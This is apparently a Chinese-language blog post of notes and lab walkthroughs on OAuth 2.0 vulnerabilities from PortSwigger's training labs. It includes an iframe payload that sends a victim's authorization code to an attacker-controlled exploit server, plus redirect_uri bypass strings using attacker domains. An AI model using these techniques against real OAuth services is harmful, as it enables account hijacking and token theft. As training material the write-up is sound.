+++
date = '2026-10-21T15:56:26+08:00'
draft = false
title = '[PortSwigger]OAuth2.0认证漏洞'
tags = ["PortSwigger","Web安全","OAuth"]
+++

## OAuth基础

### 什么是 OAuth？

**核心定义与优势**
* **OAuth 是一个常用的授权框架**，允许网站和 Web 应用请求对用户在**另一个应用**上的账户进行有限访问。
* **关键优势**：用户可以在不向请求应用暴露其登录凭证的情况下授予访问权限。
* **控制权**：用户可以精细控制要共享的数据，而不是将账户的完全控制权交给第三方。

**常见用途**
1. **集成第三方功能**：需要访问用户账户特定数据时使用。例如，请求访问你的邮件联系人列表以推荐好友。
2. **第三方身份验证**：允许用户使用他们在不同网站上的现有账户进行登录。

**注意 (Note)**
* 尽管 OAuth 2.0 是当前标准，但仍有部分网站使用旧版 OAuth 1a。
* OAuth 2.0 是重新编写的，并非从 OAuth 1.0 直接发展而来，因此两者差异很大。
* **重要说明**：在相关的所有材料中，术语“OAuth”仅指代 **OAuth 2.0**。

### OAuth 2.0 是如何工作的？

**核心机制**
OAuth 2.0 最初是为了在应用之间共享特定数据的访问权限而开发的。它通过定义三个不同参与方之间的交互来工作。

**三个参与方 (Three distinct parties)**
*   **客户端应用 (Client application)**：想要访问用户数据的网站或 Web 应用。
*   **资源所有者 (Resource owner)**：客户端应用想要访问其数据的用户。
*   **OAuth 服务提供者 (OAuth service provider)**：控制用户数据及其访问权限的网站或应用（通过提供授权服务器和资源服务器 API 来支持 OAuth）。

**常见授权类型 (Flows / Grant types)**
有众多实现方式，重点聚焦于最常用的两种：**授权码模式 (authorization code)** 和 **隐式模式 (implicit)**。

**基本流程的四个阶段**
1.  **发起请求**：客户端应用请求访问用户数据的子集，指定想要使用的授权类型及所需的访问权限。
2.  **用户同意**：提示用户登录 OAuth 服务，并明确同意请求的访问权限。
3.  **获取令牌**：客户端应用接收一个唯一的访问令牌 (access token)，证明用户已授权。（具体如何接收因授权类型而异）
4.  **调用 API**：客户端应用使用该访问令牌发起 API 调用，从资源服务器获取相关数据。

## OAuth授权类型

### 什么是 OAuth 授权类型 (OAuth grant type)?

**核心定义与作用**
*   **决定流程步骤**：OAuth 授权类型决定了 OAuth 流程中涉及的具体步骤顺序。
*   **决定通信方式**：影响客户端应用在每个阶段如何与 OAuth 服务通信，包括访问令牌（access token）是如何被发送的。
*   **术语别称**：正因为如此，授权类型通常也被称为 **“OAuth 流” (OAuth flows)**。

**前置条件与指定方式**
*   **服务端配置**：OAuth 服务必须先配置支持特定的授权类型，客户端应用才能发起相应的流程。
*   **客户端指定**：客户端应用在向 OAuth 服务发送的**初始授权请求**中，会指定想要使用的授权类型。

**常见类型**
存在几种不同的授权类型，每种在复杂度和安全考量上都有所不同。重点聚焦于当前最常用的两种：
1.  **授权码模式 (Authorization code)**
2.  **隐式模式 (Implicit)**

## OAuth 作用域 (OAuth scopes)

**核心概念**
对于任何 OAuth 授权类型，客户端应用必须指定它想要访问的数据以及想要执行的操作。这是通过向 OAuth 服务发送的授权请求中的 `scope` 参数来实现的。

**格式特点**
*   **服务特有**：对于基础 OAuth，客户端应用可请求的 scope 对于每个 OAuth 服务都是唯一的。
*   **高度自由**：由于 scope 的名称只是任意文本字符串，不同提供商之间的格式可能差异巨大。有些甚至使用完整的 URI 作为 scope 名称（类似于 REST API 端点）。
*   **示例**（请求读取通讯录权限时的不同表示方式）：
```text
scope=contacts
scope=contacts.read
scope=contact-list-r
scope=https://oauth-authorization-server.com/auth/scopes/user/contacts.readonly
```

**在认证场景中的变化**
*   当 OAuth 被用于**身份验证** (Authentication) 时，通常使用标准化的 **OpenID Connect** scopes 替代。
*   例如：`openid profile` scope 将授予客户端应用读取用户预定义基本信息（如电子邮件地址、用户名等）的权限。

### Lab1: Authentication bypass via OAuth implicit flow

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/PortSwigger/OAuth/LAB1-%E6%8F%8F%E8%BF%B0.avif)

使用wiener的凭据进行一次正常登录, 观察请求:

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/PortSwigger/OAuth/LAB1-%E8%A7%82%E5%AF%9F%E8%AF%B7%E6%B1%82%E8%AE%B0%E5%BD%95.avif)

发现向/authentication发送了凭据

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/PortSwigger/OAuth/LAB-1authentication%E6%8F%90%E4%BA%A4.avif)

将email改为`carlos@carlos-montoya.net`,发送后得到一个cookie

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/PortSwigger/OAuth/LAB-1%E4%BF%AE%E6%94%B9%E5%8F%82%E6%95%B0.avif)

使用新cookie请求carlos的页面, 成功登录

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/PortSwigger/OAuth/LAB-1%E6%88%90%E5%8A%9F%E7%99%BB%E5%BD%95.avif)

## 有缺陷的CSRF防护

理想情况下，state 参数应包含一个不可猜测的值，例如当用户首次发起 OAuth 流程时，与用户会话绑定的某些内容的哈希值。然后，该值作为客户端应用程序的 CSRF 令牌形式，在客户端应用程序和 OAuth 服务之间来回传递。因此，如果你注意到授权请求没有发送 state 参数，从攻击者的角度来看，这是非常值得关注的。这可能意味着他们可以自己发起一个 OAuth 流程，然后诱骗用户的浏览器来完成它，类似于传统的 CSRF 攻击。这可能会产生严重的后果，具体取决于客户端应用程序如何使用 OAuth。

### Lab2: Forced OAuth profile linking

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/PortSwigger/OAuth/LAB-2%E6%8F%8F%E8%BF%B0.avif)

访问靶场, 使用传统方式登录后, 点击 `Attach a social profile` 关联社交媒体账号, 之后退出登录再通过社交媒体账号重新登录, 注意到`/oauth-linking`没有防止CSRF的state参数  

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/PortSwigger/OAuth/LAB-2%E6%97%A0State%E5%8F%82%E6%95%B0.avif)

打开BurpProxy, 点击Attach a social profile, 复制网址后再丢弃这个请求, 这样就能保证这个链接有效

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/PortSwigger/OAuth/LAB-2%E6%8B%A6%E6%88%AA.avif)

在exploit-server中通过iframe触发CSRF

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/PortSwigger/OAuth/LAB-2%E5%88%A9%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AE%BE%E7%BD%AE.avif)

点击Deliver exploit to victim, 当管理员访问时就会通过CSRF自动访问社交媒体账户绑定链接, 而这个链接绑定的目标媒体账户是攻击者的, 所以可将管理员的账户绑定到我们的社交媒体账号上, 使用社交媒体账号重新登录即可进入管理员面板, 删除carlos账号

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/PortSwigger/OAuth/LAB-2%E8%A7%A3%E5%86%B3.avif)

## 泄露授权码和访问令牌

**核心问题**
OAuth 服务配置不当可能导致攻击者窃取其他用户的授权码（Authorization Codes）或访问令牌（Access Tokens），从而完全接管受害者在任何已注册客户端应用中的账户。

**攻击原理与流程**
1. **重定向 URI 校验不严**：在 OAuth 流程中，凭证会通过受害者浏览器发送到 `redirect_uri` 指定的 `/callback` 端点。如果 OAuth 服务没有正确验证该 URI，攻击者就可以构建类似 CSRF 的攻击，诱导受害者浏览器发起 OAuth 流程，并将凭证发送到**攻击者控制**的 `redirect_uri`。
2. **授权码流程的特殊风险**：
   * 攻击者可以在受害者的授权码被使用前将其截获。
   * 攻击者随后将这个被窃取的授权码发送到客户端应用**合法的** `/callback` 端点（即原始的 `redirect_uri`）。
   * **关键点**：只要受害者与 OAuth 服务保持有效会话，客户端应用就会在攻击者不知晓客户端密钥（client secret）或最终访问令牌的情况下，代替攻击者完成代码/令牌交换，从而将攻击者登录到受害者的账户中。

**防御绕过**
* 仅仅使用 `state` 或 `nonce` 参数进行保护**并不能**必然阻止此类攻击，因为攻击者完全可以从他们自己的浏览器中生成新的 `state` 或 `nonce` 值。

### Lab3: OAuth account hijacking via redirect_uri

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/PortSwigger/OAuthLAB-3%E6%8F%8F%E8%BF%B0.avif)

进入实验室, 进行一次正常的登录, 观察历史流量, 找到`/auth`端点

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/PortSwigger/OAuthLAB-3auth.avif)

观察发现客户端向`/auth`端点发送了`redirect_uri`参数, 认证后服务器重定向请求到`redirect_uri?code=令牌`

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/PortSwigger/OAuthPixPin_2026-11-08_19-24-06.avif)

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/PortSwigger/OAuthLAB-3oauth-callback.avif)

更改`redirect_uri`参数, 发现服务器仍正常响应

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/PortSwigger/OAuthLAB-3%E6%9B%B4%E6%94%B9%E9%87%8D%E5%AE%9A%E5%90%91.avif)

那么我们可以构造一个`redirect_uri`为攻击者服务器的链接, 这样在受害者认证通过后就会将code返回给攻击者的服务器, 我们再通过令牌去请求正常的接口, 就可以实现登录

在exploit_server中通过iframe向受害者传递恶意链接

```html
<iframe src="https://oauth-0a61000d04b8b24281e750de02b30028.oauth-server.net/auth?client_id=u2z2eo4kolkxlya08rtvm&redirect_uri=https://exploit-0a4e00ac04cfb2f081e9516401210057.exploit-server.net/&response_type=code&scope=openid%20profile%20email"></iframe>
```

传递给受害者, 等受害者完成认证, 我们就能在exploit_server中得到code

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/PortSwigger/OAuthLAB-3%E8%8E%B7%E5%BE%97code.avif)

使用该code访问正常的`/oauth-callback`端点, 即可登录受害者账户

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/PortSwigger/OAuthLAB-3%E6%88%90%E5%8A%9F%E7%99%BB%E5%BD%95.avif)

在Admin panel中删除carlos的账户即可通关

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/PortSwigger/OAuthLAB-3%E5%88%A0%E9%99%A4carlos.avif)

## 有缺陷的重定向验证

**背景**
最佳实践是客户端应用在 OAuth 服务注册回调 URI 白名单，OAuth 服务据此验证 `redirect_uri` 参数。此时尽管攻击者直接将`redirect_uri`篡改为外部 URI 会导致错误，但攻击者仍有多种方法绕过此验证。

**常见的绕过测试技术与方法**
1. **宽松的字符串匹配**：
   * 某些实现仅检查字符串是否以正确的域名开头。可以尝试添加/删除任意路径、查询参数或片段（fragments），看是否会触发错误。
2. **URI 解析差异 (解析器混淆)**：
   * 如果可以在默认 `redirect_uri` 追加额外值，可利用不同组件解析 URI 时的差异进行绕过。
   * 示例：`https://default-host.com &@foo.evil-user.net#@bar.evil-user.net/`（类似 SSRF 和 CORS 绕过技巧）。
3. **服务端参数污染 (HPP)**：
   * 尝试提交重复的 `redirect_uri` 参数。
   * 示例：`https://oauth-authorization-server.com/?client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net`
4. **`localhost` 特例利用**：
   * 服务器通常对开发用的 `localhost` URI 给予特殊处理。可以尝试注册类似 `localhost.evil-user.net` 的域名来绕过生产环境的验证。

**高级测试建议：参数组合**
* 不要孤立地测试 `redirect_uri`。修改其他参数有时会影响验证逻辑。
* **更改 `response_mode`**：从 `query` 改为 `fragment` 有时会完全改变 `redirect_uri` 的解析方式，从而允许提交原本被阻止的 URI。
* **利用 `web_message` 模式**：如果支持此响应模式，通常允许 `redirect_uri` 中包含更广泛的子域名。

## 通过代理页面窃取访问令牌

**核心思路**
当无法直接将外部域名作为 `redirect_uri` 提交时，不要放弃。应利用已知的篡改技巧，尝试将 `redirect_uri` 指向**白名单域名内的其他页面**，以扩大攻击面。

**攻击步骤与方法**

1. **目录遍历 (Directory Traversal)**
   * 默认的回调 URI 往往是类似 `/oauth/callback` 的固定路径，通常没有子目录。
   * 可以利用目录遍历技巧，将 `redirect_uri` 指向白名单域名下的任意路径。
   * 示例：`https://client-app.com/oauth/callback/../../example/path`（后端可能会将其解析为 `https://client-app.com/example/path`）。

2. **寻找开放重定向 (Open Redirect)**
   * 确定可以重定向到白名单内的其他页面后，应审计这些页面的漏洞。
   * 最有效的漏洞是**开放重定向**。可以将此漏洞作为“代理”，将受害者及其授权码或令牌转发到攻击者控制的域名上。

**针对不同授权类型的要求**
* **授权码流程 (Authorization code flow)**：需要找到能让你访问**查询参数 (Query parameters)** 的漏洞。
* **隐式授权类型 (Implicit grant type)**：需要找到能提取 **URL 片段 (URL fragment)** 的漏洞。

**隐式授权类型的额外风险**
对于隐式授权类型，窃取访问令牌不仅意味着能在客户端应用上登录受害者账户。由于整个流程在浏览器中完成，攻击者还可以直接使用该令牌向 OAuth 服务的资源服务器发起 API 调用，从而获取通常无法通过客户端 Web UI 访问的敏感用户数据。